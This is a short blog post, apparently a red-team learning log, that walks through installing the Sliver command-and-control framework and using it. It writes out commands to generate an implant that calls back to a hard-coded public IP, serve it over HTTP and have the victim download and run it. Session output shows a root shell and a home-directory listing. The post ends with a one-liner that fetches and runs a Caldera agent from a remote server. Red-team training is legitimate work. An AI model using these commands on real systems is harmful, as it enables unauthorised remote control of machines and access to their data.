---
title: Red-Team Framework - (1) Sliver
author: Jeongwon
date: 2025-03-26 12:24:00 +0900
categories: [Career, RedTeam]
tags: [writing]
render_with_liquid: false
---
## How to Install Sliver
###### `REF` : [Sliver wiki](https://sliver.sh/docs?name=Getting+Started)

```bash
sudo apt update
curl https://sliver.sh/install|sudo bash

systemctl status sliver # 실행 확인
systemctl start sliver # sliver 실행

sliver
```
![image](assets/img/red-framework-sliver/activate_sliver.png)<br><br><br>

## How to Use Sliver

```bash
# [Sliver] 임플란트 생성 및 Session 서버 생성
generate --http [C2서버 공인 IP] -s [임플란트 경로 & 파일명] --os [타겟 운영체제] --arch [타겟 아키텍쳐]
http -d 54.180.117.219 -l 80

# [공격자 Bash] 웹 서버 생성
python3 -m http.server 8443 &

# [피해자 Bash] http://54.180.117.219:8443/demo.exe 접근 후 실행
wget http://54.180.117.219:8443/test
chmod +x ./test
./test
```
<br>

```bash
sliver > sessions

 ID         Transport   Remote Address     Hostname         Username   Operating System   Health  
========== =========== ================== ================ ========== ================== =========
 48df96c2   http(s)     X.X.X.X:41256     ip-172-31-45-3   root       linux/amd64        [ALIVE] 

sliver > sessions -i 48df96c2

[*] Active session ENTHUSIASTIC_APPEAL (48df96c2)

sliver (ENTHUSIASTIC_APPEAL) > whoami

Logon ID: root

sliver (ENTHUSIASTIC_APPEAL) > ls

/root (10 items, 15.0 MiB)
==========================
-rw-------  root:root  .bash_history   4.6 KiB   Sat Mar 29 16:02:16 +0000 2025
-rw-r--r--  root:root  .bashrc         3.0 KiB   Mon Apr 22 13:04:27 +0000 2024
-rw-------  root:root  .lesshst        20 B      Fri Mar 28 13:50:41 +0000 2025
-rw-------  root:root  .mysql_history  1.8 KiB   Sat Mar 29 09:24:45 +0000 2025
-rw-r--r--  root:root  .profile        161 B     Mon Apr 22 13:04:27 +0000 2024
drwx------  root:root  .ssh            <dir>     Tue Mar 18 13:17:57 +0000 2025
-rw-------  root:root  .viminfo        13.3 KiB  Sat Mar 29 09:15:21 +0000 2025
-rw-r--r--  root:root  .wget-hsts      209 B     Tue Mar 18 13:37:30 +0000 2025
drwx------  root:root  snap            <dir>     Tue Mar 18 13:18:02 +0000 2025
-rwxr-xr-x  root:root  test            15.0 MiB  Sun Mar 30 07:37:33 +0000 2025
```
<br>

Reverse Shell이 잘 연결됨을 확인할 수 있습니다.<br><br>

## Make Sliver to Connect Caldera

```bash
execute sh -c 'server="http://[Caldera 공인 IP]:8888";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > jeongwon_sliver;chmod +x jeongwon_sliver;./jeongwon_sliver -server $server -group red -v'
```
